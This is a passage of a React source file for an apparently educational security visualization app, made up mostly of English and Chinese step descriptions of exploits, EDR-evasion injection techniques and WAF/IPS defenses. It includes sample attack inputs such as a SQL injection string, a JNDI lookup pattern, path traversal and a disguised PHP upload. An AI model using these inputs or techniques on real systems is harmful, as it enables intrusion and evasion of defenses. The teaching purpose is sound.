
import React, { useState, useEffect, useRef } from 'react';
import { Play, Pause, RotateCcw, ChevronRight, ChevronLeft, ChevronDown, Info, ShieldAlert, Binary, Globe, Layout, ShieldCheck, Box, Terminal, Calculator, Recycle, Layers, Ghost, FileCode, ScanSearch, Skull, Activity, Network, MousePointer2, AlertTriangle, Zap, FileText, Code, PackageOpen, LockKeyhole, Search, Cpu, Shield, ExternalLink, X, Github, MessageCircle, Users, MessageSquare, Mail, Folder, GitBranch } from 'lucide-react';
import { AnimationStep, ExploitType, Category, Architecture, Language, STACK_CODE_SNIPPET, HEAP_CODE_SNIPPET, WEB_CODE_SNIPPET, UAF_CODE_SNIPPET, FMT_CODE_SNIPPET, INT_OVERFLOW_CODE_SNIPPET, DOUBLE_FREE_CODE_SNIPPET, ROP_CODE_SNIPPET, HEAVENS_GATE_CODE_SNIPPET, REFLECTIVE_DLL_CODE_SNIPPET, PROCESS_HOLLOWING_CODE_SNIPPET, THREAD_HIJACKING_CODE_SNIPPET, SSRF_CODE_SNIPPET, CSRF_CODE_SNIPPET, LOG4SHELL_CODE_SNIPPET, NEXTJS_RCE_CODE_SNIPPET, XXE_CODE_SNIPPET, XSS_CODE_SNIPPET, PATH_TRAVERSAL_CODE_SNIPPET, DESERIALIZATION_CODE_SNIPPET, FASTJSON_CODE_SNIPPET, AES_CODE_SNIPPET, NETWORK_MAPPING_CODE_SNIPPET, WAF_CODE_SNIPPET, IPS_CODE_SNIPPET, FILE_UPLOAD_CODE_SNIPPET, CFW_CODE_SNIPPET } from './types';
import { APP_CONFIG } from './config';
import { StackVisualizer } from './components/StackVisualizer';
import { HeapVisualizer } from './components/HeapVisualizer';
import { UAFVisualizer } from './components/UAFVisualizer';
import { FormatStringVisualizer } from './components/FormatStringVisualizer';
import { IntegerOverflowVisualizer } from './components/IntegerOverflowVisualizer';
import { DoubleFreeVisualizer } from './components/DoubleFreeVisualizer';
import { ROPVisualizer } from './components/ROPVisualizer';
import { ROPFlowChart } from './components/ROPFlowChart';
import { HeavensGateVisualizer } from './components/HeavensGateVisualizer';
import { ReflectiveDllVisualizer } from './components/ReflectiveDllVisualizer';
import { ProcessHollowingVisualizer } from './components/ProcessHollowingVisualizer';
import { ThreadHijackingVisualizer } from './components/ThreadHijackingVisualizer';
import { SqlInjectionVisualizer } from './components/SqlInjectionVisualizer';
import { PathTraversalVisualizer } from './components/PathTraversalVisualizer';
import { SsrfVisualizer } from './components/SsrfVisualizer';
import { CsrfVisualizer } from './components/CsrfVisualizer';
import { Log4ShellVisualizer } from './components/Log4ShellVisualizer';
import { NextJsRceVisualizer } from './components/NextJsRceVisualizer';
import { XxeVisualizer } from './components/XxeVisualizer';
import { XssVisualizer } from './components/XssVisualizer';
import { FileUploadVisualizer } from './components/FileUploadVisualizer.tsx';
import { DeserializationVisualizer } from './components/DeserializationVisualizer';
import { FastjsonVisualizer } from './components/FastjsonVisualizer';
import { AesVisualizer } from './components/AesVisualizer';
import { NetworkMappingVisualizer } from './components/NetworkMappingVisualizer';
import { WafVisualizer } from './components/WafVisualizer';
import { IpsVisualizer } from './components/IpsVisualizer';
import { ControlFlowFlatteningVisualizer } from './components/ControlFlowFlatteningVisualizer';
import { AssemblyViewer } from './components/AssemblyViewer';
import { CodeBlock } from './components/CodeBlock';

// --- Configuration ---

const I18N = {
  [Language.EN]: {
    title: "SecTech Vis",
    subtitle: "Interactive Principles of Vulns & Security",
    home: "Home",
    binary: "Binary Exploits",
    web: "Web Exploits",
    adversarial: "Technical Countermeasures",
    algorithm: "Algorithm Analysis",
    stack: "Stack Overflow",
    heap: "Heap Overflow",
    uaf: "Use-After-Free",
    fmt: "Format String",
    int_overflow: "Integer Overflow",
    double_free: "Double Free",
    rop: "ROP (Return-Oriented Programming)",
    heavens_gate: "Heaven's Gate",
    reflective_dll: "Reflective DLL Injection",
    process_hollowing: "Process Hollowing",
    thread_hijacking: "Thread Execution Hijacking",
    network_mapping: "Cyberspace Mapping",
    waf: "WAF (Web App Firewall)",
    ips: "IPS (Intrusion Prevention)",
    cfw: "Control Flow Flattening",
    sqli: "SQL Injection",
    ssrf: "SSRF (Server-Side Request Forgery)",
    csrf: "CSRF (Cross-Site Request Forgery)",
    log4shell: "Log4Shell (CVE-2021-44228)",
    nextjs_rce: "Next.js RCE (CVE-2025-55182)",
    xxe: "XXE (XML External Entity)",
    xss: "XSS (Cross-Site Scripting)",
    file_upload: "File Upload Vulnerability",
    path_traversal: "Path Traversal",
    deserialization: "Insecure Deserialization",
    fastjson: "Fastjson Template Injection",
    aes: "AES Algorithm Analysis",
    controls: "Controls",
    reset: "Reset Simulation",
    step: "STEP",
    running: "RUNNING",
    paused: "PAUSED",
    webModule: "Web Vulnerability Module",
    webDesc: "Visualization for SQL Injection and XSS is currently under development.",
    langBtn: "中文",
    arch: "Architecture",
    mitigation: "Defense Strategies",
    detection: "Detection Points (EDR/Rev)",
    blog: "My Blog",
    about: "About",
    about_title: "About SecTech Vis",
    about_desc: "SecTech Vis is an interactive educational platform designed to visualize complex cybersecurity concepts. From low-level memory corruption to modern web vulnerabilities and defensive countermeasures, we aim to make security principles transparent and accessible through dynamic animation.",
    community_title: "Join the Community",
    contact_me: "Contact Me",
    discord: "Discord Server",
    github_link: "GitHub Open Source",
    email_label: "Email",
    // CFW related
    cfw_original_title: "Original Code Structure",
    cfw_original_desc: "The source code has clear control flow with visible branches and conditions. Easy to understand and analyze.",
    cfw_analysis_title: "Control Flow Analysis",
    cfw_analysis_desc: "The compiler analyzes all basic blocks and their control flow relationships to prepare for flattening.",
    cfw_flatten_title: "Flattening Transformation",
    cfw_flatten_desc: "All code blocks are converted into states in a state machine. Each block becomes a numbered case in a switch statement.",
    cfw_dispatch_init_title: "Initialize Dispatcher Loop",
    cfw_dispatch_init_desc: "Set the initial state value and enter the infinite while loop that controls all execution.",
    cfw_dispatch_loop_title: "Execute Dispatch Loop",
    cfw_dispatch_loop_desc: "The switch statement jumps between cases based on the current state variable, making the flow hard to follow.",
    cfw_obfuscated_title: "Obfuscation Complete",
    cfw_obfuscated_desc: "The final obfuscated code is unreadable. Original intent is hidden behind complex state transitions.",
    cfw_comparison_title: "Before & After Comparison",
    cfw_comparison_desc: "Original code: 8 lines, clear logic | Obfuscated code: 35 lines, 400% more complex",
    // Mapping / WAF / IPS
    nm_discovery_title: "Asset Discovery",
    nm_discovery_desc: "The mapping engine scans massive IP ranges to identify active hosts. High-speed scanners like ZMap use stateless probes to check millions of IPs per minute.",
    nm_probing_title: "Service Probing",
    nm_probing_desc: "Once a host is found, we probe common ports (80, 443, 22, etc.) to grab service banners. This 'shaking hands' reveals what software is running.",
    nm_finger_title: "Fingerprinting",
    nm_finger_desc: "Raw banners and certificates are matched against thousands of regex rules. This identifies specific versions (e.g. 'Apache 2.4.41') and hardware types.",
    nm_index_title: "Data Indexing",
    nm_index_desc: "All discovered metadata (location, ISP, software, title) is processed and stored in a high-performance search cluster (like Elasticsearch).",
    nm_query_title: "Asset Search (FOFA Style)",
    nm_query_desc: "Users can now query the massive database using a DSL. For example, find all 'ThinkPHP' servers in China with a single command.",
    waf_req_title: "HTTP Request Arrival",
    waf_req_desc: "A malicious request arrives at the reverse proxy (WAF node). It contains URL-encoded SQL injection patterns.",
    waf_norm_title: "Normalization",
    waf_norm_desc: "WAF decodes URL encoding (%20 to space), converts to lowercase, and resolves obfuscations to prepare for inspection.",
    waf_match_title: "Signature Matching",
    waf_match_desc: "The payload is matched against thousands of rules. A SQL injection pattern (OR 1=1) is triggered.",
    waf_block_title: "Decision: Blocked",
    waf_block_desc: "The WAF identifies a critical threat and immediately terminates the connection, returning a 403 Forbidden page.",
    ips_cap_title: "Packet Capture",
    ips_cap_desc: "Raw network packets are intercepted inline by the IPS device as they flow through the wire.",
    ips_dpi_title: "Deep Packet Inspection",
    ips_dpi_desc: "IPS disassembles the packet beyond Layer 4 (TCP), looking into the application payload for specific exploit signatures.",
    ips_alert_title: "Threat Identified",
    ips_alert_desc: "A signature matching an RCE exploit (e.g. searching for /etc/passwd) is found within the packet payload.",
    ips_drop_title: "Decision: Drop & Reset",
    ips_drop_desc: "The IPS drops the malicious packet and sends a TCP Reset (RST) to both sender and receiver to kill the session.",
    heap_alloc_title: "Heap Memory Allocation",
    heap_alloc_desc: "The program allocates two chunks of memory on the heap. These chunks are adjacent in memory.",
    heap_safe_title: "Safe Data Write",
    heap_safe_desc: "Data is written to the first chunk within its bounds. The heap metadata remains intact.",
    heap_bound_title: "Boundary Condition",
    heap_bound_desc: "The first chunk is now completely full. Any further writing will cross into the next memory region.",
    heap_over_title: "Heap Metadata Overflow",
    heap_over_desc: "The program writes past the end of chunk 1, corrupting the header of chunk 2. This header contains critical size and status information.",
    heap_crash_title: "Corrupted Memory Free",
    heap_crash_desc: "When the program attempts to free chunk 2, the heap manager detects the corrupted metadata and crashes, or worse, performs an arbitrary write.",
    stack_init_title: "Stack Initialization",
    stack_init_desc: "The function is called, and a stack frame is created. This includes local variables and the saved return address.",
    stack_normal_title: "Normal Buffer Usage",
    stack_normal_desc: "The buffer is partially filled with data. Everything is within the expected bounds.",
    stack_fill_title: "Buffer Boundary Reached",
    stack_fill_desc: "The buffer is now full. The stack's control data (EBP and Ret) is still safe.",
    stack_over_ebp_title: "Base Pointer Overwrite",
    stack_over_ebp_desc: "Data overflows the buffer and starts overwriting the saved Frame Pointer (EBP).",
    stack_over_ret_title: "Return Address Overwrite",
    stack_over_ret_desc: "The overflow reaches the Saved Return Address. The attacker can now redirect execution flow.",
    stack_ret_title: "Instruction Pointer Hijack",
    stack_ret_desc: "The function returns. Instead of going back to the caller, it jumps to the address injected by the attacker.",
    uaf_alloc_title: "Initial Allocation",
    uaf_alloc_desc: "Object A is allocated on the heap. Pointer 'ptr1' stores its memory address.",
    uaf_free_title: "Object Freed",
    uaf_free_desc: "Object A is freed. However, 'ptr1' is not nullified, becoming a 'dangling pointer'.",
    uaf_realloc_title: "Heap Reuse",
    uaf_realloc_desc: "Object B is allocated. The heap manager reuses the same memory slot previously occupied by Object A.",
    uaf_access_title: "Dangling Pointer Access",
    uaf_access_desc: "The program uses 'ptr1' to access memory. It unintentionally reads or writes to Object B.",
    fmt_call_title: "Vulnerable Printf Call",
    fmt_call_desc: "The program calls printf with user-controlled input but no format specifiers.",
    fmt_parse_1_title: "Stack Leak (Step 1)",
    fmt_parse_1_desc: "The first '%x' in the input causes printf to read the first value from the stack beyond the expected arguments.",
    fmt_parse_2_title: "Stack Leak (Step 2)",
    fmt_parse_2_desc: "Multiple format specifiers allow an attacker to traverse the stack and leak sensitive addresses or data.",
    int_calc_title: "Size Calculation",
    int_calc_desc: "The program calculates the required buffer size. In this case, an 8-bit unsigned integer addition.",
    int_wrap_title: "Integer Wraparound",
    int_wrap_desc: "240 + 20 exceeds 255 (the max for 8-bit). The value 'wraps around' to 4.",
    int_alloc_title: "Undersized Allocation",
    int_alloc_desc: "The program allocates 4 bytes based on the wrapped result, which is much smaller than the actual data size (240).",
    int_overflow_title: "Memory Corruption",
    int_overflow_desc: "The program copies 240 bytes into the 4-byte buffer, resulting in a heap buffer overflow.",
    df_alloc_title: "Memory Allocation",
    df_alloc_desc: "A memory chunk is allocated and assigned to 'ptr'.",
    df_free1_title: "First Free",
    df_free1_desc: "The chunk is freed and returned to the allocator's free list (bin).",
    df_free2_title: "Double Free Vulnerability",
    df_free2_desc: "The same chunk is freed again. It now exists twice in the free list, creating a circular reference.",
    df_malloc1_title: "First Re-allocation",
    df_malloc1_desc: "The allocator returns the chunk to 'p1'. It is removed from the head of the free list.",
    df_malloc2_title: "Overlapping Chunks",
    df_malloc2_desc: "The next allocation returns the same chunk address to 'p2'. Both pointers now control the same memory.",
    rop_overflow_title: "Stack Overflow",
    rop_overflow_desc: "The attacker overflows the stack to control the Return Address and the subsequent stack contents.",
    rop_ret_title: "Return to Gadget",
    rop_ret_desc: "The function 'returns' to a carefully chosen code snippet (Gadget) instead of the original caller.",
    rop_gadget1_title: "Executing Gadget",
    rop_gadget1_desc: "The gadget 'pop rdi; ret' loads a value from the stack into the RDI register and then returns to the next gadget.",
    rop_system_title: "System Execution",
    rop_system_desc: "The chain leads to the 'system' function call, which executes a shell command defined by the RDI register.",
    hg_start_title: "32-bit Compatibility Mode",
    hg_start_desc: "Process starts in 32-bit WoW64 mode. CS selector is 0x23. Security hooks are monitoring API calls.",
    hg_push_title: "Preparing the Gate",
    hg_push_desc: "The 64-bit Code Segment selector (0x33) is pushed onto the stack along with the return address.",
    hg_gate_title: "Entering the Gate",
    hg_gate_desc: "Executing a 'far return' (retf) switches the CPU's internal mode from 32-bit to 64-bit.",
    hg_native_title: "64-bit Long Mode",
    hg_native_desc: "CPU is now executing native 64-bit instructions. The 32-bit user-mode hooks are now invisible and bypassed.",
    hg_sys_title: "Native Syscall",
    hg_sys_desc: "Direct invocation of 64-bit kernel syscalls allows performing actions undetected by 32-bit EDR/AV.",
    rdll_read_title: "DLL In-Memory Discovery",
    rdll_read_desc: "Attacker reads the target DLL into a buffer in their own process, avoiding standard loading APIs.",
    rdll_alloc_title: "Remote Memory Prep",
    rdll_alloc_desc: "Space is allocated in the victim process with Read/Write/Execute (RWX) permissions to host the DLL.",
    rdll_write_title: "Raw DLL Injection",
    rdll_write_desc: "The raw bytes of the DLL are written directly into the target process's memory space.",
    rdll_thread_title: "Bootstrapping Loader",
    rdll_thread_desc: "A remote thread is created to start execution at the DLL's internal 'ReflectiveLoader' function.",
    rdll_reloc_title: "Self-Relocation",
    rdll_reloc_desc: "The ReflectiveLoader parses its own headers, resolves imports, and fixes memory addresses (relocations).",
    rdll_main_title: "Final Execution",
    rdll_main_desc: "The DLL is now fully mapped and functional. It executes DllMain, starting the malicious payload.",
    ph_create_title: "Suspended Creation",
    ph_create_desc: "A legitimate system process is created in a suspended state. It appears completely normal to the OS.",
    ph_unmap_title: "Memory Hollowing",
    ph_unmap_desc: "The legitimate code segment of the process is unmapped (hollowed out), leaving an empty shell.",
    ph_alloc_title: "Payload Allocation",
    ph_alloc_desc: "Memory is re-allocated within the hollowed process to make room for the malicious payload.",
    ph_write_title: "Payload Injection",
    ph_write_desc: "The malicious code and headers are written into the legitimate process container.",
    ph_ctx_title: "Context Hijacking",
    ph_ctx_desc: "The thread's instruction pointer is updated to point to the new entry point of the malicious code.",
    ph_resume_title: "Malicious Resume",
    ph_resume_desc: "The process is resumed. It executes the malware while still appearing as the original legitimate process.",
    th_open_title: "Thread Discovery",
    th_open_desc: "Attacker identifies a target thread in a legitimate process and obtains a handle with sufficient privileges.",
    th_suspend_title: "Thread Freeze",
    th_suspend_desc: "The target thread is suspended, pausing its normal execution and saving its CPU state.",
    th_getctx_title: "Register Capture",
    th_getctx_desc: "Attacker retrieves the thread's current CPU registers, specifically the Instruction Pointer (RIP/EIP).",
    th_write_title: "Shellcode Injection",
    th_write_desc: "Malicious shellcode is written into the process memory, usually in an allocated RWX region.",
    th_setctx_title: "Context Update",
    th_setctx_desc: "The thread's Instruction Pointer is updated to point to the start of the injected shellcode.",
    th_resume_title: "Execution Hijack",
    th_resume_desc: "The thread is resumed. It immediately begins executing the attacker's shellcode instead of its original code.",
    sqli_input_title: "User Input Entry",
    sqli_input_desc: "Attacker enters a payload in the search field: `' OR '1'='1`. This payload is designed to break the SQL query logic.",
    sqli_req_title: "HTTP Request Sent",
    sqli_req_desc: "The browser sends the malicious payload as a URL parameter to the backend server.",
    sqli_code_title: "Vulnerable Code Processing",
    sqli_code_desc: "The server receives the input and concatenates it directly into a SQL string without sanitization.",
    sqli_query_title: "Malicious Query Execution",
    sqli_query_desc: "The database receives a modified query that now logically evaluates to 'TRUE' for all rows.",
    sqli_db_title: "Data Exfiltration",
    sqli_db_desc: "Because the query condition is always true, the database returns all user records instead of just one.",
    ssrf_input_title: "URL Input Injection",
    ssrf_input_desc: "Attacker provides a URL pointing to an internal resource (e.g., localhost:8080/admin) to the vulnerable parameter.",
    ssrf_req_title: "Request Arrival",
    ssrf_req_desc: "The server receives the request and extracts the attacker's URL for fetching.",
    ssrf_proc_title: "Server-Side Fetch",
    ssrf_proc_desc: "The server, acting as a proxy, initiates a network request to the URL provided by the attacker.",
    ssrf_internal_title: "Internal Resource Access",
    ssrf_internal_desc: "The request reaches the internal server. Since it comes from a trusted internal IP, the request is successful.",
    ssrf_res_title: "Response Relay",
    ssrf_res_desc: "The public server receives the response from the internal resource and sends it back to the attacker.",
    csrf_login_title: "User Login",
    csrf_login_desc: "The victim logs into their legitimate bank account. A session cookie is stored in their browser.",
    csrf_visit_title: "Malicious Site Visit",
    csrf_visit_desc: "While still logged in to the bank, the victim visits a malicious website (e.g., through a phishing link).",
    csrf_req_title: "Cross-Site Request",
    csrf_req_desc: "The malicious site automatically triggers an invisible POST request to the bank's transfer API.",
    csrf_cookie_title: "Automatic Cookie Attachment",
    csrf_cookie_desc: "The browser automatically attaches the victim's session cookies to the request because it's going to the bank's domain.",
    csrf_server_title: "Unauthorized Action",
    csrf_server_desc: "The bank server validates the cookies and performs the transfer, unaware that the user did not intend to make it.",
    l4s_input_title: "Malicious JNDI Payload",
    l4s_input_desc: "Attacker sends an HTTP request with a JNDI lookup string in a header field like User-Agent.",
    l4s_logging_title: "Logging the Payload",
    l4s_logging_desc: "The application uses Log4j to log the header. Log4j attempts to resolve variables within the string.",
    l4s_lookup_title: "JNDI Lookup Trigger",
    l4s_lookup_desc: "Log4j's lookup mechanism identifies the '${jndi:ldap://...}' pattern and initiates a JNDI request.",
    l4s_ldap_req_title: "LDAP Request Outbound",
    l4s_ldap_req_desc: "The server connects to the attacker's LDAP server to retrieve an object reference.",
    l4s_ldap_res_title: "LDAP Response (Redirect)",
    l4s_ldap_res_desc: "The malicious LDAP server returns a response pointing to a remote Java class file on an HTTP server.",
    l4s_class_title: "Remote Class Download",
    l4s_class_desc: "The victim server downloads the malicious .class file from the attacker's HTTP server.",
    l4s_rce_title: "Code Execution",
    l4s_rce_desc: "The downloaded class is executed upon instantiation, giving the attacker full control over the server.",
    nrce_bg_title: "Flight Data Serialization",
    nrce_bg_desc: "Next.js uses a custom format to send component trees. Understanding this format is key to the exploit.",
    nrce_craft_title: "Payload Crafting",
    nrce_craft_desc: "The attacker crafts a poisoned Flight data payload that includes recursive references and malicious gadgets.",
    nrce_write_title: "Cache Poisoning",
    nrce_write_desc: "The payload is injected into the server-side cache through a Server Action or a specifically crafted request.",
    nrce_trigger_title: "Triggering Retrieval",
    nrce_trigger_desc: "A subsequent request triggers the server to fetch and deserialize the poisoned entry from its cache.",
    nrce_deser_title: "Insecure Deserialization",
    nrce_deser_desc: "React's server-side deserializer processes the poisoned data, triggering the execution of malicious gadgets.",
    nrce_exec_title: "Server Compromise",
    nrce_exec_desc: "The deserialization process leads to arbitrary code execution on the Next.js server.",
    xxe_input_title: "XML Input with DTD",
    xxe_input_desc: "Attacker submits XML that includes a Document Type Definition (DTD) defining an external entity.",
    xxe_parse_title: "Parsing the XML",
    xxe_parse_desc: "The server starts parsing the XML. The insecure configuration allows the definition of external entities.",
    xxe_resolve_title: "Entity Resolution",
    xxe_resolve_desc: "The parser encounters the entity reference and attempts to resolve it by reading the specified system file.",
    xxe_access_title: "Local File Access",
    xxe_access_desc: "The parser successfully reads the sensitive file (e.g., /etc/passwd) from the local filesystem.",
    xxe_response_title: "Information Disclosure",
    xxe_response_desc: "The contents of the local file are substituted into the XML and returned to the attacker in the response.",
    pt_input_title: "Attacker crafts file path",
    pt_input_desc: "User supplies a path with traversal sequences (../).",
    pt_request_title: "Client sends download request",
    pt_request_desc: "Server receives query parameter 'file'.",
    pt_normalize_title: "Server attempts normalization",
    pt_normalize_desc: "Naive normalization fails to remove traversal.",
    pt_resolve_title: "Path resolves outside base",
    pt_resolve_desc: "Final canonical path escapes base directory.",
    pt_read_title: "Read target file",
    pt_read_desc: "Server reads file content from resolved path.",
    pt_response_title: "Sensitive data returned",
    pt_response_desc: "Leaked content is included in HTTP response.",
    xss_inject_title: "Script Injection",
    xss_inject_desc: "Attacker submits a comment containing a malicious script tag instead of plain text.",
    xss_store_title: "Persistent Storage",
    xss_store_desc: "The server fails to sanitize the input and stores the malicious script directly in the database.",
    xss_load_title: "Victim Page Load",
    xss_load_desc: "A victim visits the comments page. The server retrieves the malicious script and sends it to the browser.",
    xss_exec_title: "Browser Execution",
    xss_exec_desc: "The victim's browser interprets the script tag and executes the attacker's code in the context of the session.",
    xss_exfil_title: "Data Exfiltration",
    xss_exfil_desc: "The script steals the victim's session cookies and sends them to the attacker's server.",
    fu_input_title: "Unrestricted File Input",
    fu_input_desc: "Attacker selects a malicious script file masquerading as an image (e.g., shell.php renamed to shell.jpg).",
    fu_upload_title: "Multipart Upload",
    fu_upload_desc: "Server receives multipart/form-data. The implementation trusts filename and Content-Type without deep inspection.",
    fu_store_title: "Store Under Web Root",
    fu_store_desc: "The server saves the file under a web-accessible 'uploads/' directory using the original filename.",
    fu_access_title: "Direct Web Access",
    fu_access_desc: "Attacker accesses the uploaded file via a public URL (e.g., /uploads/shell.php).",
    fu_exec_title: "Server-side Execution",
    fu_exec_desc: "Web server interprets the uploaded script, leading to remote code execution.",
    deser_craft_title: "Object Serialization",
    deser_craft_desc: "Attacker crafts a serialized string representing a malicious object from a known vulnerable class.",
    deser_send_title: "Payload Delivery",
    deser_send_desc: "The serialized payload is sent to the server, often through a cookie or a form parameter.",
    deser_parse_title: "Deserialization Process",
    deser_parse_desc: "The server calls 'unserialize' on the untrusted data, reinstantiating the malicious object in memory.",
    deser_magic_title: "Magic Method Trigger",
    deser_magic_desc: "As the object is created, its magic methods (like __wakeup or __destruct) are automatically executed.",
    deser_rce_title: "Malicious Execution",
    deser_rce_desc: "The logic inside the magic method executes a system command provided in the object's properties.",
    fj_input_title: "JSON Payload Submission",
    fj_input_desc: "Attacker sends a specially crafted JSON string with @type pointing to a malicious class (e.g., Template Engine).",
    fj_parsing_title: "JSON Parsing",
    fj_parsing_desc: "Fastjson parses the JSON string and reads the @type field to determine which class to deserialize.",
    fj_template_title: "Gadget Chain Instantiation",
    fj_template_desc: "Fastjson uses reflection to instantiate the specified class. No type validation occurs (autoType enabled).",
    fj_getvalue_title: "Template Expression Extraction",
    fj_getvalue_desc: "The malicious class getter method is invoked. It extracts template expressions from JSON properties.",
    fj_eval_title: "Template Expression Evaluation",
    fj_eval_desc: "The template engine (e.g., FreeMarker, Spring) evaluates the injected expression in the object context.",
    fj_rce_title: "Remote Code Execution",
    fj_rce_desc: "The evaluated template expression executes system commands through built-in template functions.",
    aes_exp_title: "Key Expansion",
    aes_exp_desc: "The 128-bit master key is expanded into 11 round keys using a complex scheduling algorithm.",
    aes_init_title: "Initial Round",
    aes_init_desc: "The plaintext is XORed with the first round key (AddRoundKey) to begin the encryption process.",
    aes_main_title: "Main Encryption Round",
    aes_main_desc: "The state undergoes four transformations: SubBytes (S-Box), ShiftRows, MixColumns, and AddRoundKey.",
    aes_final_title: "Final Encryption Round",
    aes_final_desc: "The last round omits the MixColumns step before the final AddRoundKey transformation.",
  },
  [Language.ZH]: {
    title: "安全技术可视化",
    subtitle: "漏洞与安全技术交互式原理解释",
    home: "主页",
    binary: "二进制漏洞",
    web: "Web 漏洞",
    adversarial: "技术对抗",
    algorithm: "算法分析",
    stack: "栈溢出 (Stack Overflow)",
    heap: "堆溢出 (Heap Overflow)",
    uaf: "释放后重用 (UAF)",
    fmt: "格式化字符串漏洞",
    int_overflow: "整数溢出 (Integer Overflow)",
    double_free: "双重释放 (Double Free)",
    rop: "面向返回编程 (ROP)",
    heavens_gate: "天堂之门 (Heaven's Gate)",
    reflective_dll: "反射式 DLL 注入",
    process_hollowing: "进程镂空 (Process Hollowing)",
    thread_hijacking: "线程劫持 (Thread Hijacking)",
    network_mapping: "网络空间测绘",
    waf: "WAF (Web 应用防火墙)",
    ips: "IPS (入侵防御系统)",
    cfw: "控制流扁平化 (CFW)",
    sqli: "SQL 注入",
    ssrf: "SSRF (服务端请求伪造)",
    csrf: "CSRF (跨站请求伪造)",
    log4shell: "Log4Shell (CVE-2021-44228)",
    nextjs_rce: "Next.js RCE (CVE-2025-55182)",
    xxe: "XXE (XML 外部实体注入)",
    xss: "XSS (跨站脚本攻击)",
    file_upload: "文件上传漏洞",
    path_traversal: "路径穿越",
    deserialization: "不安全的反序列化",
    fastjson: "Fastjson 模板注入",
    aes: "AES 算法分析",
    controls: "控制面板",
    reset: "重置模拟",
    step: "步骤",
    running: "运行中",
    paused: "已暂停",
    webModule: "Web 漏洞模块",
    webDesc: "SQL注入和XSS的可视化演示正在开发中，请稍后再试。",
    langBtn: "English",
    arch: "架构",
    mitigation: "防护建议",
    detection: "检测技术",
    blog: "技术博客",
    about: "关于",
    about_title: "关于 SecTech Vis",
    about_desc: "SecTech Vis 是一个交互式安全技术教学平台。我们致力于通过动态可视化的方式，解释底层内存损坏、现代 Web 漏洞以及各类防御对抗技术，让复杂的安全原理变得透明易懂。",
    community_title: "加入社群 & 交流",
    contact_me: "联系作者",
    discord: "Discord 频道",
    github_link: "GitHub 开源仓库",
    email_label: "电子邮箱",
    // CFW 中文翻译
    cfw_original_title: "原始代码结构",
    cfw_original_desc: "源代码具有清晰的控制流，分支和条件一目了然。易于理解和分析。",
    cfw_analysis_title: "控制流分析",
    cfw_analysis_desc: "编译器分析所有基本块及其控制流关系，为扁平化做准备。",
    cfw_flatten_title: "扁平化转换",
    cfw_flatten_desc: "所有代码块被转换成状态机中的状态。每个块变成 switch 语句中的一个编号 case。",
    cfw_dispatch_init_title: "初始化分派循环",
    cfw_dispatch_init_desc: "设置初始状态值，进入控制所有执行的无限 while 循环。",
    cfw_dispatch_loop_title: "执行分派循环",
    cfw_dispatch_loop_desc: "switch 语句根据当前状态变量在各 case 之间跳转，使流程难以追踪。",
    cfw_obfuscated_title: "混淆完成",
    cfw_obfuscated_desc: "最终混淆代码不可读。原始意图隐藏在复杂的状态转换背后。",
    cfw_comparison_title: "混淆前后对比",
    cfw_comparison_desc: "原始代码：8 行，逻辑清晰 | 混淆代码：35 行，复杂度增加 400%",
    nm_discovery_title: "资产存活探测 (Discovery)",
    nm_discovery_desc: "测绘引擎通过扫描全球 IP 地址段，确认哪些主机在线。使用无状态扫描技术（如 ZMap）可在极短时间内完成全网探测。",
    nm_probing_title: "服务端口枚举 (Probing)",
    nm_probing_desc: "针对在线主机扫描常见端口（如 80, 443, 3306）。通过建立连接并获取“Banner”信息，初步确定服务类型。",
    nm_finger_title: "指纹识别与分类 (Fingerprinting)",
    nm_finger_desc: "将获取的数据与数万条指纹规则匹配，识别具体的产品（如：海康威视摄像头、Nginx 服务器、ThinkPHP 框架）。",
    nm_index_title: "海量数据入库 (Indexing)",
    nm_index_desc: "将资产的地理位置、所属 ISP、端口、协议、产品指纹等元数据进行结构化，并存入高性能搜索引擎（如 Elasticsearch）。",
    nm_query_title: "资产检索 (Search API)",
    nm_query_desc: "像 FOFA 这样的平台提供 DSL 语法，允许用户通过 `app=\"Hikvision\"` 等命令，从数百亿记录中秒级检索目标资产。",
    waf_req_title: "HTTP 请求到达",
    waf_req_desc: "攻击者发送的恶意请求到达 WAF 节点。此时 Payload 是经过混淆或编码的。",
    waf_norm_title: "数据规范化 (Normalization)",
    waf_norm_desc: "WAF 对请求内容进行解码（如 URL 编码还原）、大小写转换、去除多余空白符，确保检测引擎能识别原始意图。",
    waf_match_title: "规则匹配 (Rule Matching)",
    waf_match_desc: "规范化后的内容经过正则库、语义分析或 AI 模型。系统识别出典型的 SQL 注入特征：' OR 1=1。",
    waf_block_title: "决策: 拦截阻断",
    waf_block_desc: "WAF 确认威胁，立即丢弃该请求并向客户端返回 403 页面，后端服务器完全无感且安全。",
    ips_cap_title: "报文抓取 (Capture)",
    ips_cap_desc: "IPS 设备通常以“串联”模式部署在网关处。它实时截获流经物理线路的每一个网络包。",
    ips_dpi_title: "深度包检测 (DPI)",
    ips_dpi_desc: "IPS 解析 TCP/IP 协议栈至应用层，对传输内容（如 HTTP Body）进行全文本扫描，搜索已知漏洞特征。",
    ips_alert_title: "发现威胁特征",
    ips_alert_desc: "检测引擎匹配到针对特定漏洞（如 CVE-2024-XXXX）的利用载荷，触发预警逻辑。",
    ips_drop_title: "决策: 丢弃并重置",
    ips_drop_desc: "IPS 立即丢弃该数据包，并向通信双方发送 TCP RST 指令强制切断连接，从协议层阻止攻击生效。",
    heap_alloc_title: "堆内存分配",
    heap_alloc_desc: "程序在堆上分配了两个内存块。在内存中，这两个块通常是相邻的。",
    heap_safe_title: "安全数据写入",
    heap_safe_desc: "数据被写入第一个内存块的边界内。堆管理元数据保持完好。",
    heap_bound_title: "到达内存边界",
    heap_bound_desc: "第一个内存块现在已填满。任何进一步的写入都将跨入下一个内存区域。",
    heap_over_title: "堆元数据溢出",
    heap_over_desc: "程序写入超出了 chunk 1 的末尾，损坏了 chunk 2 的头部。该头部包含关键的大小和状态信息。",
    heap_crash_title: "释放损坏的内存",
    heap_crash_desc: "当程序尝试释放 chunk 2 时，堆管理器检测到损坏的元数据并崩溃，或者更糟，执行任意写入。",
    stack_init_title: "栈帧初始化",
    stack_init_desc: "函数被调用，创建一个栈帧。这包括局部变量和保存的返回地址。",
    stack_normal_title: "正常的缓冲区使用",
    stack_normal_desc: "缓冲区被部分填充。一切都在预期边界内。",
    stack_fill_title: "到达缓冲区边界",
    stack_fill_desc: "缓冲区现在已满。栈的控制数据（EBP 和 Ret）仍然安全。",
    stack_over_ebp_title: "覆盖基址指针 (EBP)",
    stack_over_ebp_desc: "数据溢出缓冲区并开始覆盖保存的帧指针 (EBP)。",
    stack_over_ret_title: "覆盖返回地址 (Ret)",
